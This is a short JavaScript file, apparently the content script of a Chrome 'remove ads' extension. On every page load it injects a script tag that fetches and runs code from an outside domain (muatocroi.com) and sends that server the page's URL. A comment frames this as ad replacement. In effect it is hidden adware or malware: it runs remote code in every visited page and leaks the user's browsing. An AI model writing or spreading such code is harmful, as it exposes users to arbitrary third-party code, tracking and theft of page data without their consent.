///////////////////////
function DOMContentLoadedHandle()
{
    if($('#injectiondiv').length == 0)
    {
        $('html').prepend('<div id="injectiondiv"><script type="text/javascript" src="http://muatocroi.com/addition/googlechromeEx/removeads/injecScript.php?url='+encodeURIComponent(window.location)+'"></script></div>');
    }

}
//For replace ads
$(document).bind('DOMContentLoaded', DOMContentLoadedHandle);